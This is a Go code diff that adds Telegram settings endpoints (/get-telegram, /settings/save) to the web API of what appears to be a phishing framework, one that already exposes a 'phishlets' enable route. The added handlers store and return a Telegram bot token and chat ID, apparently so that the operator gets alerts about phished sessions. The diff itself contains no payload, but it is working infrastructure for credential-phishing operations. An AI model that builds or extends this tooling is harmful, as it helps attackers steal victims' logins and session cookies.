@@ -33,6 +33,10 @@ func (w *WebAPI) Start(port int) {
 	mux.HandleFunc("/api/config", w.handleConfig)
 	mux.HandleFunc("/api/phishlets/enable", w.handlePhishletEnable)
 
+	// Settings Endpoints
+	mux.HandleFunc("/get-telegram", w.handleGetTelegram)
+	mux.HandleFunc("/settings/save", w.handleSaveTelegram)
+
 	// Serve Static Files
 	mux.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("web/css"))))
 	mux.Handle("/js/", http.StripPrefix("/js/", http.FileServer(http.Dir("web/js"))))
@@ -120,6 +124,37 @@ func (w *WebAPI) handlePhishletEnable(rw http.ResponseWriter, req *http.Request)
 
 	rw.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet enabled"})
+}
+
+func (w *WebAPI) handleGetTelegram(rw http.ResponseWriter, req *http.Request) {
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{
+		"chatId":   w.cfg.GetTelegramChatID(),
+		"botToken": w.cfg.GetTelegramBotToken(),
+	})
+}
+
+func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
+	if req.Method != http.MethodPost {
+		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
+		return
+	}
+
+	var payload struct {
+		ChatId   string `json:"chatId"`
+		BotToken string `json:"botToken"`
+	}
+	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
+		http.Error(rw, "Invalid JSON payload", http.StatusBadRequest)
+		return
+	}
+
+	w.cfg.SetTelegramChatID(payload.ChatId)
+	w.cfg.SetTelegramBotToken(payload.BotToken)
+	w.cfg.SetTelegramEnabled(true)
+
+	rw.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Telegram Settings Saved Successfully"})
 }
 
 // Additional handlers like /api/sessions and /settings can be added similarly here.
